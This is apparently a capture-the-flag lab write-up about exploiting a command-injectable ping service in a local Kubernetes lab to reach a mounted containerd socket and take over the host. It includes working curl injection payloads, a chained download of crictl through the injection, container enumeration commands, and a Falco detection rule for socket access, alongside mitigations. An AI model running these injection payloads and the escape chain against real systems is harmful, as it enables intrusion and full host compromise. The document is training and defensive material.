# Scenario 2: DIND (Docker-in-Docker) Exploitation

## Challenge Overview

**Difficulty**: Intermediate
**Attack Vector**: Command injection leading to container runtime socket access
**MITRE ATT&CK**: T1059.004 (Command and Scripting Interpreter: Unix Shell), T1611 (Escape to Host), T1552 (Unsecured Credentials)
**OWASP K8s Top 10**: K01 - Insecure Workload Configurations

## Scenario Description

A web application provides a "ping" utility that accepts user input. The application runs in a container that has the host's containerd socket mounted - a common (mis)configuration for CI/CD pipelines that need to build container images.

## Reconnaissance

### Initial Discovery

The target application runs on `http://127.0.0.1:1231/` and provides a simple ping interface.

```bash
# Testing the ping functionality
curl -X POST http://127.0.0.1:1231 -d "endpoint=127.0.0.1"
```

The application accepts a hostname/IP and executes a ping command.

### Testing for Command Injection

Classic command injection payloads using shell operators:

```bash
# Using && to chain commands
curl -s -X POST http://127.0.0.1:1231 --data-urlencode "endpoint=127.0.0.1 && whoami"

# Using ; to chain commands
curl -s -X POST http://127.0.0.1:1231 -d "endpoint=127.0.0.1;pwd"
```

Both payloads worked, confirming **command injection vulnerability** - user input is passed unsanitized to a shell.

## Exploitation

### Step 1: Environment Enumeration

```bash
# Check current directory
curl -s -X POST http://127.0.0.1:1231 --data-urlencode "endpoint=127.0.0.1 && pwd"
# Result: /

# List root filesystem
curl -s -X POST http://127.0.0.1:1231 --data-urlencode "endpoint=127.0.0.1 && ls -la /"
```

Notable discovery: A `/custom` directory exists, which is unusual in standard containers.

### Step 2: Discovering the Container Runtime Socket

```bash
# Explore the custom directory
curl -s -X POST http://127.0.0.1:1231 --data-urlencode "endpoint=127.0.0.1 && ls -la /custom/containerd"
```

**Critical finding:**
```
srw-rw---- 1 root root 0 Dec 9 11:20 containerd.sock
```

A **containerd socket** is mounted into the container! The `s` prefix indicates this is a socket file.

### Step 3: Downloading Exploitation Tools

The container has `curl` and `wget` available. We can download `crictl` (Kubernetes CRI-compatible CLI):

```bash
curl -s -X POST http://127.0.0.1:1231 --data-urlencode "endpoint=127.0.0.1 && \
  curl -sLO https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.28.0/crictl-v1.28.0-linux-amd64.tar.gz && \
  tar -xzf crictl-v1.28.0-linux-amd64.tar.gz && \
  chmod +x crictl"
```

### Step 4: Enumerating Host Containers

With `crictl` and access to the containerd socket, we can list all containers on the host:

```bash
curl -s -X POST http://127.0.0.1:1231 --data-urlencode \
  "endpoint=127.0.0.1 && ./crictl -r unix:///custom/containerd/containerd.sock ps"
```

**Result:** Complete visibility into ALL containers on the node, including:
- Kubernetes system components (kube-apiserver, etcd, kube-scheduler, kube-controller-manager)
- CoreDNS
- All application workloads

### Step 5: Inspecting Container Configurations

```bash
curl -s -X POST http://127.0.0.1:1231 --data-urlencode \
  "endpoint=127.0.0.1 && ./crictl -r unix:///custom/containerd/containerd.sock inspect <container-id>"
```

**Critical discovery in system-monitor container:**
```json
{
  "mounts": [
    {
      "containerPath": "/host-system",
      "hostPath": "/",
      "readonly": false
    }
  ]
}
```

The `system-monitor` container has the **entire host filesystem mounted** at `/host-system` with read-write access.

### Attack Chain Summary

```
Command Injection
       |
       v
Filesystem Enumeration
       |
       v
Discovered containerd.sock
       |
       v
Downloaded crictl
       |
       v
Enumerated all host containers
       |
       v
Found containers with host filesystem mounts
       |
       v
FULL HOST COMPROMISE
```

## Real-World Impact

### Why DIND Exists

Organizations mount container runtime sockets for legitimate reasons:
- **CI/CD pipelines**: Jenkins, GitLab CI runners need to build images
- **Container management tools**: Portainer, Rancher agents
- **Monitoring solutions**: Some require direct container access

### Attacker Capabilities

With containerd socket access, an attacker can:

1. **List all containers** on the node
2. **Pull sensitive images** from private registries (using cached credentials)
3. **Exec into any container** on the host
4. **Create new privileged containers** with host filesystem mounts
5. **Access Kubernetes secrets** stored in etcd
6. **Escape to the host** completely
7. **Pivot to other nodes** in the cluster

### Real-World Incidents

- **Tesla (2018)**: Exposed Kubernetes dashboard led to cryptomining
- **Shopify Bug Bounty**: Container escape via exposed Docker socket
- Numerous CI/CD compromises via Jenkins/GitLab runner misconfigurations

## Mitigations

### Prevention

1. **Never mount container runtime sockets into workloads**
   ```yaml
   # BAD - Don't do this
   volumes:
   - name: containerd-sock
     hostPath:
       path: /run/containerd/containerd.sock
   ```

2. **Use rootless container builds**
   - Kaniko (Google)
   - Buildah (Red Hat)
   - img (Genuinetools)

3. **Implement Pod Security Standards**
   ```yaml
   apiVersion: v1
   kind: Namespace
   metadata:
     labels:
       pod-security.kubernetes.io/enforce: restricted
   ```

4. **Validate user input**
   ```go
   // Use allowlists, not blocklists
   if !isValidIPAddress(input) {
       return error
   }
   // Use exec with arguments, not shell
   cmd := exec.Command("ping", "-c", "2", validatedIP)
   ```

5. **Network Policies**
   ```yaml
   apiVersion: networking.k8s.io/v1
   kind: NetworkPolicy
   metadata:
     name: deny-metadata
   spec:
     podSelector: {}
     policyTypes:
     - Egress
     egress:
     - to:
       - ipBlock:
           cidr: 0.0.0.0/0
           except:
           - 169.254.169.254/32  # Block metadata service
   ```

### Detection

1. **Runtime security monitoring** (Falco rules):
   ```yaml
   - rule: Container Runtime Socket Accessed
     condition: >
       open_read and container and
       (fd.name contains "docker.sock" or fd.name contains "containerd.sock")
     output: "Container runtime socket accessed (user=%user.name command=%proc.cmdline)"
     priority: WARNING
   ```

2. **Audit container mounts** regularly
3. **Alert on crictl/docker CLI downloads** in containers

### Response

If compromise is detected:
1. Isolate the affected node immediately
2. Capture forensic evidence (container logs, network traffic)
3. Rotate all credentials accessible from that node
4. Review etcd for accessed secrets
5. Check for persistence mechanisms on host

## Tools Used

- `curl` - HTTP requests and file downloads
- `crictl` - Kubernetes CRI-compatible container CLI
- Command injection techniques

## Key Takeaways

1. **Container runtime sockets are root-equivalent** - Mounting them is like giving root access to the host
2. **Defense in depth fails** - Command injection alone is bad, but combined with socket access it's catastrophic
3. **CI/CD is a prime target** - Build systems often have excessive privileges
4. **Input validation is critical** - Never pass user input to shell commands
5. **Least privilege principle** - Question every volume mount, every capability

---

*Completed with assistance from Claude (Anthropic) - AI pair programming for security learning*
